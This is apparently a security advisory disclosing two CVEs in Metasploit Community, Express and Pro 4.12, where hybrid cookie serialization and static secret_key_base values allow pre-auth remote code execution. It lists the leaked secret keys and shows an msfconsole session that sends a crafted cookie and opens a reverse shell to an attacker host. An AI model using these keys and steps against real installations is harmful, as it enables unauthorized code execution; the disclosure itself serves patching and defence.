The following two issues combine to constitute a pre-auth Remote Code Execution
vulnerability in Metasploit Community, Express and Pro 4.12 where any of
certain Weekly Release updates between 4.12.0-2016061501 and 4.12.0-2016083001
have been applied.

Both issues were patched by Rapid7 in Weekly Release 4.12.0-2016091401

A Metasploit Framework module that exploits these issues has been submitted for
inclusion at <https://github.com/rapid7/metasploit-framework/pull/7341>

CVE-2016-1000243 Metasploit Web UI's `config.action_dispatch.cookies_serializer` is set to `:hybrid`
----------------------------------------------------------------------------------------------------

* OVE ID: OVE-20160904-0001
* Private disclosure date: 2016-09-04
* Public disclosure date: 2016-09-19
* Vendor advisory: <https://community.rapid7.com/community/metasploit/blog/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401>
* Affected versions: Metasploit 4.12.0 up to and including 4.12.0-2016083001

Rails applications accept signed cookies for managing sessions. Rails prior to
4.1 used Marshal serialization, which allowed for arbitrary instantiation of
objects upon deserialization. Rails 4.1 introduced JSON cookie serialization
`[0]` as the new default. Deserialization of JSON does not allow for arbitrary
object instantiation, making it a much safer configuration in the event that
the cookie signing key becomes known.

Rails 4.1 also introduced 'hybrid' cookie serialization, which allows for
deserialization of both JSON and Marshal serialized cookies. This is to ease
the transition from Rails <4.1 to Rails >=4.1 and avoids the invalidation of
existing sessions when the server crosses that version boundary.

When the cookie serialization setting is either Marshal or hybrid, a remote
unauthenticated attacker with knowledge of the cookie signing key can craft
session cookies that, upon Marshal deserialization, trigger the execution of
arbitrary code `[1]`.

Metasploit Community, Express and Pro has the Web UI's
`config.action_dispatch.cookies_serializer` setting set to `:hybrid` before
Metasploit 4.12.0-2016091401

Rapid7 changed the Metasploit UI's `config.action_dispatch.cookies_serializer`
setting to `:json` in Metasploit 4.12.0-2016091401.

Users should upgrade to Metasploit 4.12.0-2016091401 or newer.

References:

* `[0]` <http://blog.bigbinary.com/2014/12/23/migrating-existing-session-cookies-while-upgrading-to-rails-4-1-and-above.html>
* `[1]` <https://www.rapid7.com/db/modules/exploit/multi/http/rails_secret_deserialization>

CVE-2016-1000244 Metasploit Weekly Release Static `secret_key_base` pre-auth RCE
--------------------------------------------------------------------------------

* OVE ID: OVE-20160904-0002
* Private disclosure date: 2016-09-04
* Public disclosure date: 2016-09-19
* Vendor advisory: https://community.rapid7.com/community/metasploit/blog/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401
* Affected versions: Metasploit 4.12.0-2016061501 up to and including 4.12.0-2016083001

Metasploit Community, Express and Pro, after having had any of a particular set
of Weekly Release updates applied, will have a static and publicly discoverable
`secret_key_base` value for its Web UI. This allows a remote unauthenticated
attacker to craft a signed cookie that will be deserialized by the application.
Due to the fact that Metasploit has its
`config.action_dispatch.cookies_serializer` setting set to `:hybrid`, this
allows a remote unauthenticated attacker to cause the deserialization of
arbitrary Marshalled objects, resulting in pre-auth RCE as the `daemon` user.

The known `secret_key_base` values are as follows:

```text
4.12.0-2016061501,d25e9ad8c9a1558a6864bc38b1c79eafef479ccee5ad0b4b2ff6a917cd8db4c6b80d1bf1ea960f8ef922ddfebd4525fcff253a18dd78a18275311d45770e5c9103fc7b639ecbd13e9c2dbba3da5c20ef2b5cbea0308acfc29239a135724ddc902ccc6a378b696600a1661ed92666ead9cdbf1b684486f5c5e6b9b13226982dd7
4.12.0-2016062101,99988ff528cc0e9aa0cc52dc97fe1dd1fcbedb6df6ca71f6f5553994e6294d213fcf533a115da859ca16e9190c53ddd5962ddd171c2e31a168fb8a8f3ef000f1a64b59a4ea3c5ec9961a0db0945cae90a70fd64eb7fb500662fc9e7569c90b20998adeca450362e5ca80d0045b6ae1d54caf4b8e6d89cc4ebef3fd4928625bfc
4.12.0-2016072501,446db15aeb1b4394575e093e43fae0fc8c4e81d314696ac42599e53a70a5ebe9c234e6fa15540e1fc3ae4e99ad64531ab10c5a4deca10c20ba6ce2ae77f70e7975918fbaaea56ed701213341be929091a570404774fd65a0c68b2e63f456a0140ac919c6ec291a766058f063beeb50cedd666b178bce5a9b7e2f3984e37e8fde
4.12.0-2016081001,61c64764ca3e28772bddd3b4a666d5a5611a50ceb07e3bd5847926b0423987218cfc81468c84a7737c23c27562cb9bf40bc1519db110bf669987c7bb7fd4e1850f601c2bf170f4b75afabf86d40c428e4d103b2fe6952835521f40b23dbd9c3cac55b543aef2fb222441b3ae29c3abbd59433504198753df0e70dd3927f7105a
4.12.0-2016081201,23bbd1fdebdc5a27ed2cb2eea6779fdd6b7a1fa5373f5eeb27450765f22d3f744ad76bd7fbf59ed687a1aba481204045259b70b264f4731d124828779c99d47554c0133a537652eba268b231c900727b6602d8e5c6a73fe230a8e286e975f1765c574431171bc2af0c0890988cc11cb4e93d363c5edc15d5a15ec568168daf32
4.12.0-2016083001,18edd3c0c08da473b0c94f114de417b3cd41dace1dacd67616b864cbe60b6628e8a030e1981cef3eb4b57b0498ad6fb22c24369edc852c5335e27670220ea38f1eecf5c7bb3217472c8df3213bc314af30be33cd6f3944ba524c16cafb19489a95d969ada268df37761c0a2b68c0eeafb1355a58a9a6a89c9296bfd606a79615
unreleased build,b4bc1fa288894518088bf70c825e5ce6d5b16bbf20020018272383e09e5677757c6f1cc12eb39421eaf57f81822a434af10971b5762ae64cb1119054078b7201fa6c5e7aacdc00d5837a50b20a049bd502fcf7ed86b360d7c71942b983a547dde26a170bec3f11f42bee6a494dc2c11ae7dbd6d17927349cdcb81f0e9f17d22c
```

Code execution can be achieved using the Metasploit Framework module
`exploit/multi/http/rails_secret_deserialization`. Note that, as of the time of
writing, this module does not work against modern Ruby. There is an open PR
`[0]` that fixes the popchain to make this module great again.

A standalone module that exploits this issue has been submitted for inclusion
in Metasploit Framework `[1]`:

```text
msf exploit(metasploit_static_secret_key_base) > info

       Name: Metasploit Web UI Static secret_key_base Value
     Module: exploit/multi/http/metasploit_static_secret_key_base
   Platform: Ruby
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2016-09-15

Provided by:
  Justin Steven
  joernchen of Phenoelit <joernchen@phenoelit.de>

Available targets:
  Id  Name
  --  ----
  0   Metasploit 4.12.0-2016061501 to 4.12.0-2016083001

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                       yes       The target address
  RPORT      3790             yes       The target port
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The path to the Metasploit Web UI
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits the Web UI for Metasploit Community, Express
  and Pro where one of a certain set of Weekly Releases have been
  applied. These Weekly Releases introduced a static secret_key_base
  value. Knowledge of the static secret_key_base value allows for
  deserialization of a crafted Ruby Object, achieving code execution.
  This module is based on
  exploits/multi/http/rails_secret_deserialization

References:
  OVE (20160904-0002)
  https://community.rapid7.com/community/metasploit/blog/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401

msf exploit(metasploit_static_secret_key_base) > set RHOST 172.18.0.2
RHOST => 172.18.0.2
msf exploit(metasploit_static_secret_key_base) > set PAYLOAD ruby/shell_reverse_tcp
PAYLOAD => ruby/shell_reverse_tcp
msf exploit(metasploit_static_secret_key_base) > set LHOST 172.18.0.1
LHOST => 172.18.0.1
msf exploit(metasploit_static_secret_key_base) > set LPORT 4444
LPORT => 4444
msf exploit(metasploit_static_secret_key_base) > exploit

[*] Started reverse TCP handler on 172.18.0.1:4444
[*] Checking for cookie _ui_session
[*] Searching for proper SECRET
[*] Sending cookie _ui_session
[*] Command shell session 1 opened (172.18.0.1:4444 -> 172.18.0.2:47590) at 2016-09-19 19:26:30 +1000

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
exit
^C
Abort session 1? [y/N]  y

[*] 172.18.0.2 - Command shell session 1 closed.  Reason: User exit
```

Rapid7 addressed this issue in Metasploit 4.12.0-2016091401. Upon installing
the update, it will check if one of the known `secret_key_base` values are in
use, and if so, will regenerate it.

Users should upgrade to Metasploit 4.12.0-2016091401 or newer.

References:

* `[0]` <https://github.com/rapid7/metasploit-framework/pull/7304>
* `[1]` <https://github.com/rapid7/metasploit-framework/pull/7341>

Justin Steven

<https://twitter.com/justinsteven>
